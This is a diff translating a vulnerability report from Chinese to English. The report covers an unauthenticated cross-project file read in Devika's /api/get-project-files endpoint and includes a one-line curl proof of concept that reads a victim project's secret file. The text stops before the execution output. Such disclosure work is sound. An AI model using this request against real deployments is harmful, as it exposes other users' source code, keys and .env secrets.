@@ -1,21 +1,22 @@
-# Devika：未认证跨项目文件读取（GET /api/get-project-files）
+# Devika: unauthenticated cross-project file read via GET /api/get-project-files
 
-## 描述
+## Description
 
-`GET /api/get-project-files`（src/project.py:148-174）按 `project_name` 参数遍历 `data/projects/<name>/` 目录并返回每个可读文件的完整内容，无认证、无项目属主绑定——项目名即可枚举猜测。
+`GET /api/get-project-files` (src/project.py:148-174) walks `data/projects/<project_name>/` for the given parameter and returns the full text of every readable file — no authentication and no ownership binding; project names are enumerable.
 
-## 影响
+## Impact
 
-任何能访问 1337 端口的网络客户端读取其他项目的全部源码/数据文件（项目目录中可能含 .env、密钥、内部代码）。
+Any network client that can reach port 1337 reads all source/data files of other projects (project directories may contain .env files, keys, internal code).
 
 ## PoC
 
 ```bash
-# 前提：存在受害者项目 data/projects/victim-project/SECRET.txt（内容 "victim secret data 42"）
+# Prerequisite: victim project exists at data/projects/victim-project/SECRET.txt
+#               (content: "victim secret data 42")
 curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
 ```
 
-## 执行结果
+## Execution result
 
 ```
 $ curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
